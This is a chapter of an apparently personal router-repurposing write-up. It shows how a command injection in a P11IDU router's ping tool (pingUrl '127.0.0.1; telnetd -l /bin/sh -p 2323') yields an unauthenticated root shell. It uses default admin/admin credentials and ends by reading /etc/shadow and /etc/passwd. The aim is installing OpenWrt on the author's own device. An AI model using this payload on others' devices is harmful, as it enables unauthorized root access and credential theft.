# 05 — Getting a Root Shell

> 👤 **Author:** Nipun Methmal · Part 5 of 9 · [← Index](../README.md) · [Next →](06-installing-openwrt.md)

The RCE in [doc 04](04-rce-cmd-145.md) gives you one command per HTTP request. Useful, but clumsy —
`wget`, `sysupgrade` and exploratory work all want an actual terminal. So the next step was turning
a one-shot injection into a persistent shell.

## The chain

```
 ┌──────────────────────┐   cmd=100, admin/admin
 │  POST /cgi-bin/lua.cgi│──────────────────────► valid sessionId
 └──────────┬───────────┘
            │  cmd=145, tool=ping_start,
            │  pingUrl = "127.0.0.1; telnetd -l /bin/sh -p 2323"
            ▼
 ┌──────────────────────┐   os.execute("… ping … ; telnetd … &")
 │  Device spawns shell │──────────────────────► TCP 2323, root, no auth
 └──────────┬───────────┘
            │  tool=get_log  →  confirm from the response
            ▼
        Connect:  telnet 192.168.8.1 2323
```

### Step by step

**1 — Log in**

```powershell
& scripts/web-login.ps1 -Password 'admin' -OutFile .\sid.txt
# → SESSION: <sid>
```

**2 — Spawn the listener**

```powershell
# cmd=145 / tool=ping_start / pingUrl carries the payload
'{"cmd":145,"sessionId":"<sid>","language":"EN","method":"POST",
  "tool":"ping_start","pingLoop":"0","pingNum":"1",
  "pingUrl":"127.0.0.1; telnetd -l /bin/sh -p 2323"}'
```

**3 — Confirm without guessing**

```powershell
'{"cmd":145,"sessionId":"<sid>","language":"EN","method":"POST","tool":"get_log"}'
# → {"cmd":145,"success":true,"data":"PING 127.0.0.1 …"}
```

**4 — Connect**

```
C:\> telnet 192.168.8.1 2323

P11IDU login: root
Password: ********

BusyBox v1.x.x built-in shell (ash)
root@P11IDU:~#
```

**5 — First thing to read**

```sh
cat /etc/shadow          # confirm the md5crypt hash seen in the image
cat /etc/passwd          # the stray 'test' account
cat /etc/config/network  # the wired 'wan' that later became a nuisance
```

Both account hashes matched the firmware image exactly — a good sanity check that we were looking
at the running device and not some stale copy.

## The tooling: `tnexec.ps1`

Every later step of this project ran through one small PowerShell helper, kept in
[`scripts/tnexec.ps1`](../scripts/tnexec.ps1). It exists because raw `telnet` from PowerShell is
unpleasant:

```powershell
& tnexec.ps1 -Router 192.168.8.1 -User root -Pass $env:P11_PASS -Command $hereString
```

What it does:

1. Opens a `TcpClient`, negotiates the telnet **IAC** sequences and strips them byte-by-byte.
2. Reads until the `login:` prompt, sends the username, reads until `Password:`, sends the password.
3. Sends your command block followed by a **unique marker** (`echo __M####__True`).
4. Keeps reading until that marker appears (or `-CmdTimeout` expires), then prints everything.

The marker trick matters: it distinguishes "the shell is done" from "the shell is still typing", and
it survives interleaved output.

### Hard-won gotchas (all real)

| Symptom | Cause | Fix |
|---|---|---|
| `-ash: not found` on an inline `cmd` | PowerShell stripped the quotes around `\|` when passing `-Command` as an argument | Always pass multi-line commands as a **here-string inside a `.ps1` file**, never inline |
| `grep -E Connected\|SSID\|signal` errors | Same quoting loss — the remote shell saw unquoted `\|` | Use a script file, or avoid quotes entirely |
| Telnet session drops mid-script | `service network reload` restarts the network stack under you | Put any `reload` **last** in a command block, and expect to reconnect |
| `nft` chain not found | Postrouting chain is named `srcnat`, not `postrouting` | `nft list ruleset` and read the real names |

That last one is worth remembering: **always read the ruleset before editing it.**

## Why we stopped here

Shell in hand meant the interesting part of the research was over. What remained was a
straightforward, if careful, engineering job: put a supported operating system on the thing
([doc 06](06-installing-openwrt.md)) and then make it do something useful
([doc 07](07-building-the-repeater.md)).

---

> 📖 Next: [06 — Installing OpenWrt](06-installing-openwrt.md)

---
> ✍️ © 2026 **Nipun Methmal** · MIT License · *p11idu-openwrt-repeater*
